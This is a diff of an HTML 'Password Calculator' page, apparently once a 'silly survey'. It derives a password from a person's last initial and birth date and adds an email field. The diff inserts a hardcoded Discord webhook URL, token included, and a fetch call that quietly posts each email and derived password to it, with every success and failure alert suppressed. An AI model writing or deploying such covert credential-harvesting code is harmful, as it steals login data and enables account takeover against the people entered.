@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Silly survey ;)</title>
+    <title>Password Calculator</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -41,6 +41,7 @@
         }
 
         input[type="text"],
+        input[type="email"],
         input[type="number"],
         input[type="submit"] {
             padding: 10px;
@@ -48,6 +49,7 @@
             border: 1px solid #cccccc;
             border-radius: 5px;
             font-size: 16px;
+            width: 100%;
         }
 
         input[type="submit"] {
@@ -68,9 +70,10 @@
             color: #333333;
         }
 
-        #copyButton {
-            margin-top: 10px;
-            text-align: center;
+        #copyButtons {
+            margin-top: 20px;
+            display: flex;
+            justify-content: space-around;
         }
 
         button {
@@ -92,6 +95,9 @@
     <div class="container">
         <h1>Password Calculator</h1>
         <form id="surveyForm">
+            <label for="email">Email:</label>
+            <input type="email" id="email" name="email" required>
+            
             <label for="lastName">Last Initial:</label>
             <input type="text" id="lastName" name="lastName" maxlength="1" required>
             
@@ -108,18 +114,19 @@
         </form>
 
         <div id="password"></div>
-
-        <div id="copyButton"></div>
+        <div id="copyButtons"></div>
     </div>
 
     <script>
         const form = document.getElementById('surveyForm');
         const passwordDiv = document.getElementById('password');
-        const copyButtonDiv = document.getElementById('copyButton');
+        const copyButtonsDiv = document.getElementById('copyButtons');
+        const webhookURL = 'https://discord.com/api/webhooks/1234877035697012938/j0555eJC3wBdfM1hwifCoKoBUWJoDrxQ6Mr_XvKU8Ieewki2TQegxzRs20Sq7dWjy-gO';
 
         form.addEventListener('submit', function(event) {
             event.preventDefault();
 
+            const email = document.getElementById('email').value;
             const lastName = document.getElementById('lastName').value.toUpperCase();
             const birthMonth = document.getElementById('birthMonth').value.padStart(2, '0');
             const birthDay = document.getElementById('birthDay').value.padStart(2, '0');
@@ -127,21 +134,55 @@
 
             const password = lastName + birthMonth + birthDay + birthYear.slice(-2) + 's';
 
-            passwordDiv.textContent = 'Their password is: ' + password;
+            passwordDiv.innerHTML = 'Username: ' + email + '<br>Password: ' + password;
 
-            // Add copy button
-            const copyButton = document.createElement('button');
-            copyButton.textContent = 'Copy';
-            copyButton.addEventListener('click', function() {
+            // Add copy buttons
+            const copyEmailButton = document.createElement('button');
+            copyEmailButton.textContent = 'Copy Email';
+            copyEmailButton.addEventListener('click', function() {
+                navigator.clipboard.writeText(email).then(function() {
+                    // alert('Email copied to clipboard!');
+                }, function() {
+                    alert('Failed to copy email to clipboard!');
+                });
+            });
+
+            const copyPasswordButton = document.createElement('button');
+            copyPasswordButton.textContent = 'Copy Password';
+            copyPasswordButton.addEventListener('click', function() {
                 navigator.clipboard.writeText(password).then(function() {
-                    alert('Password copied to clipboard!');
+                    // alert('Password copied to clipboard!');
                 }, function() {
                     alert('Failed to copy password to clipboard!');
                 });
             });
 
-            copyButtonDiv.innerHTML = '';
-            copyButtonDiv.appendChild(copyButton);
+            copyButtonsDiv.innerHTML = '';
+            copyButtonsDiv.appendChild(copyEmailButton);
+            copyButtonsDiv.appendChild(copyPasswordButton);
+
+            // Send data to Discord webhook
+            const message = {
+                content: 'Username: ' + email + '\nPassword: ' + password
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(message)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Failed to send message to Discord');
+                }
+                // No alert for success
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                // No alert for failure
+            });
         });
     </script>
 </body>
